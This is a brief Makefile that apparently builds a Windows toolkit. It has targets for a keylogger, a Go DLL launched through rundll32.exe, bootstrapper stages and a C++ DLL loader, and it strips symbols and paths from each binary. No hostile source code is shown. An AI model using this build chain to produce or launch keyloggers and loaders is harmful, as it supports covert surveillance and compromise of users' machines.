FUNC := Test
KEYLOG = cmd/keylog/main
DLLMAIN = cmd/dllmain/main
OUT := ${DLLMAIN}SRC

copy:
	go run addons/addons.go

keylog:
	env GOOS=windows go build -o ${KEYLOG} -ldflags="-s -w" -trimpath ${KEYLOG}.go

dllrun:
	rundll32.exe ${OUT}.dll ${FUNC}

dllbuild:
	set CC=i686-w64-mingw32-gcc
	set CXX=i686-w64-mingw32-g++
	set GOARCH=386
	set CGO_ENABLED=1
	go build -v -o ${OUT}.dll -buildmode=c-shared -ldflags "-s -w" ${DLLMAIN}.go

dllexe:
	set CC=i686-w64-mingw32-gcc
	set CXX=i686-w64-mingw32-g++
	set GOARCH=386
	set CGO_ENABLED=1
	env GOOS=windows go build -o ${DLLMAIN} -ldflags="-s -w" -trimpath ${DLLMAIN}.go

bootstrapper:
	go run cmd/bootstrapper/main.go

bs2:
	go run cmd/bs2/main.go

loaderdll:
	gcc -c -DBUILD_DLL cmd/dllmain/dllmain.cpp
	gcc -shared -o cmd/dllmain/mainSRC.dll cmd/dllmain/dllmain.o -Wl,--add-stdcall-alias